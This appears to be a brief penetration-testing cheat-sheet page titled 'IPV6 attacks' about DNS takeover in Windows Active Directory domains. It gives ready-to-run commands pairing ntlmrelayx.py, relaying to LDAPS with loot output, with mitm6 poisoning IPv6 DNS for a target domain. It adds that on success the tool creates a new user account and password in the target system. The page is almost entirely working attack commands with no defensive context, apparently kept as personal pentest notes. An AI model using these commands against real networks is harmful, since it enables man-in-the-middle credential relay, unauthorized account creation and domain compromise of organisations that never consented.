---
description: >-
  DNS takeover // Usually DNS is not configured for IPV6 so we create our own
  dns
---

# IPV6 attacks

```
ntlmrelayx.py -6 -t ldaps://<ip> -wh <name>.<domain>.local -lootme
```

RUN IT IF NO ERRORS THEN RUN

(mitm6 tool is needed)

```
sudo mitm6 -d <domain name>.local
```

\[Only is event occurs we get access ex-reboot/login etc]

CHECK THE `LOOTME` FILE MENTIONED ABOVE FOR INFO WHICH MAY HAVE BEEN COLLECTED

IF success ; the tool generates a new user and password for us IN the target system

